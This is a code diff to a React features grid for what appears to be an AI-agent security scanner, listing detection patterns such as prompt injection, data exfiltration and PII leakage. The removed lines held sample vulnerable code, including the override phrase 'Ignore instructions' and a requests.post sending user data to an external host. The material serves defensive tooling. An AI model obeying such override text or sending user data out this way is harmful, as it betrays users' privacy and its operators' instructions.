@@ -4,28 +4,32 @@ const patterns = [
   {
     title: "Prompt Injection",
     severity: "HIGH",
-    code: `# Vulnerable code
-prompt = f"Classify: {user_input}"
-# Attacker input: "Ignore instructions"`,
     description: "Detects when user input can manipulate system prompts"
   },
   {
     title: "Infinite Loop",
     severity: "HIGH",
-    code: `while agent.should_continue():
-    response = agent.query(prompt)
-    # No max_iterations check`,
     description: "Catches recursive agent calls without termination"
   },
   {
     title: "Data Exfiltration",
     severity: "CRITICAL",
-    code: `# Sends PII to external API
-requests.post(
-    "external-api.com",
-    data=user_data
-)`,
     description: "Identifies unauthorized data transmission patterns"
+  },
+  {
+    title: "Excessive API Usage",
+    severity: "MEDIUM",
+    description: "Prevents runaway costs from uncontrolled LLM calls"
+  },
+  {
+    title: "PII Leakage",
+    severity: "CRITICAL",
+    description: "Ensures sensitive data doesn't leave your system"
+  },
+  {
+    title: "Tool Access Control",
+    severity: "HIGH",
+    description: "Validates agent permissions to execute commands"
   }
 ];
 
@@ -56,33 +60,28 @@ const FeaturesGrid = () => {
               whileInView={{ opacity: 1, y: 0 }}
               viewport={{ once: true }}
               transition={{ delay: index * 0.1, duration: 0.5 }}
-              className="bg-card border border-border rounded-lg overflow-hidden hover:border-accent transition-colors"
+              className="bg-card border border-border rounded-lg p-6 hover:border-primary/50 transition-colors"
             >
-              <div className="p-4 border-b border-border flex items-center justify-between">
+              <div className="flex items-center justify-between mb-3">
                 <h3 className="font-semibold text-sm">{pattern.title}</h3>
                 <span className={`text-xs px-2 py-1 rounded ${
                   pattern.severity === 'CRITICAL' 
                     ? 'bg-destructive/10 text-destructive' 
                     : pattern.severity === 'HIGH'
                     ? 'bg-warning/10 text-warning'
-                    : 'bg-accent/10 text-accent'
+                    : 'bg-primary/10 text-primary'
                 }`}>
                   {pattern.severity}
                 </span>
               </div>
-              <div className="p-4">
-                <pre className="text-xs font-mono text-muted-foreground mb-3 overflow-x-auto">
-                  {pattern.code}
-                </pre>
-                <p className="text-xs text-muted-foreground">{pattern.description}</p>
-              </div>
+              <p className="text-sm text-muted-foreground">{pattern.description}</p>
             </motion.div>
           ))}
         </div>
 
         <div className="text-center mt-8">
-          <a href="#" className="text-sm text-accent hover:underline">
-            View all 50+ patterns in our documentation →
+          <a href="#" className="text-sm text-primary hover:underline">
+            See all patterns in documentation →
           </a>
         </div>
       </div>
